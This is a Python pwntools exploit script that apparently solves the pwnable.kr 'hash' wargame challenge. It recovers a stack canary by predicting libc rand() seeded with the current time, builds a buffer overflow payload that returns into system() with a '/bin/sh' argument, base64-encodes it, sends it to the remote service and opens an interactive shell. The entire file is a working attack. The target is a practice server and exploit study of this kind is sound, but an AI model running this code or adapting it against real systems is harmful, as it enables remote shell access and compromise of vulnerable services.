from pwn import *
import math
import base64
import time
from ctypes import CDLL, c_int




def compute_cookie(epoch, captcha):
    libc.srand(epoch)

    randoms = [libc.rand() for i in range(8)]

    result_without_cookie = (randoms[1] + randoms[5]) + (randoms[2] - randoms[3]) + (randoms[4] - randoms[6]) + randoms[7]

    return c_int(c_int(captcha).value - c_int(result_without_cookie).value).value


libc = CDLL('libc.so.6')

null_byte = b'\x00'

io = remote('pwnable.kr', 9002)
# io = process('./hash')

epoch_time = math.floor(time.time())

io.recvline()
captcha = io.recvline(keepends=False).decode().split(' : ')[1]
io.sendline(captcha)

cookie = compute_cookie(epoch_time, int(captcha, 10))


if cookie % (16 ** 2) != 0:
    # if last byte is not 0, its not the cookie
    exit()

junk = bytes('A' * 512, 'utf-8')

system_address = p32(0x08048880)
shell_string_address = p32(0x0804b3b8)

payload = junk + p32(cookie) + bytes(12 * 'A', 'utf-8') + system_address + bytes(4 * 'A', 'utf-8') + shell_string_address + 3 * null_byte

encoded_payload = base64.b64encode(payload) + null_byte + b'AA' + b'/bin/sh'

io.sendlineafter('paste me!\n', encoded_payload)

io.interactive()
